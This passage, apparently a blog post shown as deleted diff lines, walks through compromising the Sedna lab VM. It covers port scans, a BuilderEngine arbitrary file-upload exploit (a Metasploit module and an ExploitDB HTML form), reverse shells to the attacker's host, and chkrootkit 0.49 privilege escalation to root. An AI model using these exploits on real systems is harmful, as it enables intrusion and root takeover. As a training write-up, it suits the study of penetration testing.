-exploitation on Sedna</p></blockquote>
-
-<p>Alrighty, let&rsquo;s hack the planet!</p>
-
-<!-- more -->
-
-
-<p>Plenty of open ports:</p>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
-|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
-|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
-|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
-53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
-| dns-nsid:
-|_  bind.version: 9.9.5-3-Ubuntu
-80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
-| http-robots.txt: 1 disallowed entry
-|_Hackers
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html).
-110/tcp   open  pop3        Dovecot pop3d
-|_pop3-capabilities: CAPA TOP AUTH-RESP-CODE SASL PIPELINING STLS RESP-CODES UIDL
-|_ssl-date: TLS randomness does not represent time
-111/tcp   open  rpcbind     2-4 (RPC #100000)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100024  1          48644/tcp  status
-|_  100024  1          58324/udp  status
-139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-143/tcp   open  imap        Dovecot imapd (Ubuntu)
-|_imap-capabilities: post-login STARTTLS more SASL-IR LITERAL+ have IMAP4rev1 listed OK capabilities Pre-login LOGINDISABLEDA0001 ID ENABLE IDLE LOGIN-REFERRALS
-|_ssl-date: TLS randomness does not represent time
-445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
-993/tcp   open  ssl/imaps?
-|_ssl-date: TLS randomness does not represent time
-995/tcp   open  ssl/pop3s?
-|_ssl-date: TLS randomness does not represent time
-8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
-| http-methods:
-|_  Potentially risky methods: PUT DELETE
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: Apache-Coyote/1.1
-|_http-title: Apache Tomcat
-48644/tcp open  status      1 (RPC #100024)
-</code></p>
-
-<p>Hit a couple of walls with the first enumeration attempts. The robots.txt has a Hackers entry that doesn&rsquo;t lead anywhere. Nothing usable for the bind server and the OpenSSH. enum4linux came back empty because I had no username/password pair to specify. And the Tomcat server did not use default credentials. So I fired up Gobuster and it found some additional things to check:</p>
-
-<p>```
-gobuster -w /usr/share/wordlists/dirb/big.txt -u <a href="http://192.168.145.128/">http://192.168.145.128/</a></p>
-
-<p>=====================================================</p>
-
-<h1>2018/11/16 14:56:38 Starting gobuster</h1>
-
-<p>/.htpasswd (Status: 403)
-/.htaccess (Status: 403)
-/blocks (Status: 301)
-/files (Status: 301)
-/modules (Status: 301)
-/robots.txt (Status: 200)
-/server-status (Status: 403)
-/system (Status: 301)
-/themes (Status: 301)
-```</p>
-
-<p>I visited each link, there are lots of directory listings for what appears to be a blog and ecommerce application. Some directories blocked me from entering, but I did find an indication of the target application inside <a href="http://192.168.145.128/themes/default_theme_2016/description.txt">http://192.168.145.128/themes/default_theme_2016/description.txt</a></p>
-
-<p><code>
-Default Theme 2016 for BuilderEngine V3.
-</code></p>
-
-<p>Searching for BuilderEngine exploits gave me 2 results, 1 exploitDB exploit and 1 Metasploit module. Let&rsquo;s see both in action, starting with Metasploit!</p>
-
-<h2>Low privilege shell &ndash; Metasploit</h2>
-
-<p>```
-search builderengine</p>
-
-<h1>Matching Modules</h1>
-
-<p>   Name                                          Disclosure Date  Rank       Check  Description</p>
-
-<hr />
-
-<p>   exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution</p>
-
-<p>Name       Current Setting  Required  Description</p>
-
-<hr />
-
-<p>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-   RHOST      192.168.145.128  yes       The target address
-   RPORT      80               yes       The target port (TCP)
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /                yes       The base path to BuilderEngine
-   VHOST                       no        HTTP server virtual host</p>
-
-<p>Payload options (php/meterpreter_reverse_tcp):</p>
-
-<p>   Name   Current Setting  Required  Description</p>
-
-<hr />
-
-<p>   LHOST  192.168.145.133  yes       The listen address (an interface may be specified)
-   LPORT  8000             yes       The listen port
-```</p>
-
-<p>Ran it and got a Meterpreter shell:</p>
-
-<p>```
-msf exploit(multi/http/builderengine_upload_exec) > run</p>
-
-<p>[<em>] Started reverse TCP handler on 192.168.145.133:8000
-[+] Our payload is at: ppWvWjKRuV.php. Calling payload&hellip;
-[</em>] Calling payload&hellip;
-[*] Meterpreter session 1 opened (192.168.145.133:8000 &ndash;> 192.168.145.128:53518) at 2018-11-16 15:21:54 -0500
-[+] Deleted ppWvWjKRuV.php</p>
-
-<p>meterpreter >
-```</p>
-
-<p>The kernel is old, so plenty of privilege escalations should be available:</p>
-
-<p>```
-meterpreter > sysinfo
-Computer    : Sedna
-OS          : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
-Meterpreter : php/linux</p>
-
-<p>meterpreter > cat /etc/lsb-release
-DISTRIB_ID=Ubuntu
-DISTRIB_RELEASE=14.04
-DISTRIB_CODENAME=trusty
-DISTRIB_DESCRIPTION=&ldquo;Ubuntu 14.04.1 LTS&rdquo;
-```</p>
-
-<p>I used Searchsploit to look for Ubuntu 14.04 exploits and went with the <a href="https://www.exploit-db.com/exploits/37292/">37292.c overlayfs exploit</a>/ I downloaded it to the machine, compiled it, ran it..and surprise, no root! I also tried the Apport exploit, still no luck. While looking around though, I did find the low privilege flag:</p>
-
-<p><code>
-meterpreter &gt; cat /var/www/flag.txt
-bfbb7e6e6e88d9ae66848b9aeac6b289
-</code></p>
-
-<p>Before continuing with rooting the machine, I went back getting a shell without Metasploit.</p>
-
-<h2>Low privilege shell &ndash; manual</h2>
-
-<p>Here&rsquo;s the ExploitDB variant of arbitrary file upload:</p>
-
-<p>```
-cat 40390.php</p>
-
-<!-- 
-# Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
-# Date: 18/09/2016
-# Exploit Author: metanubix
-# Vendor Homepage: http://builderengine.org/
-# Software Link: http://builderengine.org/page-cms-download.html
-# Version: 3.5.0
-# Tested on: Kali Linux 2.0 64 bit
-# Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"
-
-1) Unauthenticated Unrestricted File Upload:
-
-    POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/
-
-    Vulnerable Parameter: files[]
-
-    We can upload test.php and reach the file via the following link:
-    /files/test.php
--->
-
-
-<p><html>
-<body>
-<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"></p>
-
-<pre><code>&lt;input type="file" name="files[]" /&gt;
-&lt;input type="submit" value="send" /&gt;
-</code></pre>
-
-<p></form>
-</body>
-</html>
-```</p>
-
-<p>I created a HTML file with the above code, changing localhost to the Sedna IP. Then I used it to upload a reverse shell:</p>
-
-<p><img class="center" src="/images/pentest/sedna/form.jpg" title="&lsquo;upload&rsquo; &lsquo;upload form&rsquo;" ></p>
-
-<p>Then I went to <a href="http://192.168.145.128/files/shell.php">http://192.168.145.128/files/shell.php</a> and got the shell on my Netcat listener. Back to searching for ways to get root. I also find a possible post-exploitation flag in <em>/etc/passwd</em>:</p>
-
-<p><code>
-crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
-</code></p>
-
-<p>Cracking the password for this user might be another flag, but first I need root. Since the exploits I&rsquo;ve tried so far didn&rsquo;t work, I decided to go down the <a href="https://www.exploit-db.com/exploits/40839/">dirtycow</a> route. Unfortunately, that didn&rsquo;t work either, besides crashing the kernel. Well, I did not expect for so many privilege escalation exploits to fail.</p>
-
-<h2>Getting root</h2>
-
-<p>The solution came from something unexpected..and that needed a less targeted enumeration..more like generally looking around the box. Inside /etc, I noticed <em>chkrootkit</em> was present. I searched for available exploits and found a privilege escalation one:</p>
-
-<p>```
-searchsploit chkrootkit</p>
-
-<hr />
-
-<p> Exploit Title                                                                   |  Path</p>
-
-<pre><code>                                                                             | (/usr/share/exploitdb/)
-</code></pre>
-
-<hr />
-
-<p>Chkrootkit &ndash; Local Privilege Escalation (Metasploit)                             | exploits/linux/local/38775.rb
-Chkrootkit 0.49 &ndash; Local Privilege Escalation                                     | exploits/linux/local/33899.txt</p>
-
-<hr />
-
-<p>Shellcodes: No Result
-```</p>
-
-<p>The exploit is available for version 0.49, so let&rsquo;s see what version is on the box:</p>
-
-<p><code>
-www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V
-./chkrootkit -V
-chkrootkit version 0.49
-</code></p>
-
-<p>Perfect! I decided to use Metasploit for this, I kept getting errors in my shell related to previous overlayfs attempts. But the way to do it manually is to put an executable file called <em>update</em> with content of your choice in /tmp and wait for chkrootkit to run it as root.</p>
-
-<p>Metasploit came through and finally, I got root:</p>
-
-<p>```
-msf exploit(unix/local/chkrootkit) > options</p>
-
-<p>Module options (exploit/unix/local/chkrootkit):</p>
-
-<p>   Name        Current Setting       Required  Description</p>
-
-<hr />
-
-<p>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
-   SESSION                           yes       The session to run this module on.</p>
-
-<p>Exploit target:</p>
-
-<p>   Id  Name</p>
-
-<hr />
-
-<p>   0   Automatic</p>
-
-<p>msf exploit(unix/local/chkrootkit) > set SESSION 1
-SESSION => 1
-msf exploit(unix/local/chkrootkit) > run</p>
-
-<p>[!] SESSION may not be compatible with this module.
-[<em>] Started reverse TCP double handler on 192.168.145.133:4444
-[!] Rooting depends on the crontab (this could take a while)
-[</em>] Payload written to /tmp/update
-[<em>] Waiting for chkrootkit to run via cron&hellip;
-[</em>] Accepted the first client connection&hellip;
-[<em>] Accepted the second client connection&hellip;
-[</em>] Command: echo EzISATvm3xKkw6bX;
-[<em>] Writing to socket A
-[</em>] Writing to socket B
-[<em>] Reading from sockets&hellip;
-[</em>] Reading from socket B
-[<em>] B: &ldquo;EzISATvm3xKkw6bX\r\n&rdquo;
-[</em>] Matching&hellip;
-[<em>] A is input&hellip;
-[</em>] Command shell session 2 opened (192.168.145.133:4444 &ndash;> 192.168.145.128:37176) at 2018-11-17 08:05:04 -0500
-[+] Deleted /tmp/update
-whoami
-root
-```</p>
-
-<p>Got the root flag:</p>
-
-<p><code>
-cat /root/flag.txt
-a10828bee17db751de4b936614558305
-</code></p>
-
-<p>It was not over though, there should be one more flag, so I remembered the Tomcat server and looked inside <code>/etc/tomcat7/tomcat-users.xml</code> to find the username and password for Tomcat:</p>
-
-<p><code>
-&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;
-</code></p>
-
-<p>I didn&rsquo;t want to crack the password for the 4th flag, so I decided to call it a day at &frac34; flags.</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ I must have a prodigious quantity of  \
-| mind; it takes me as much as a week   |
-| sometimes to make it up.              |
-|                                       |
-\ &mdash; Mark Twain, &ldquo;The Innocents Abroad&rdquo; /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
 </code></pre>
 
 <p>```</p>
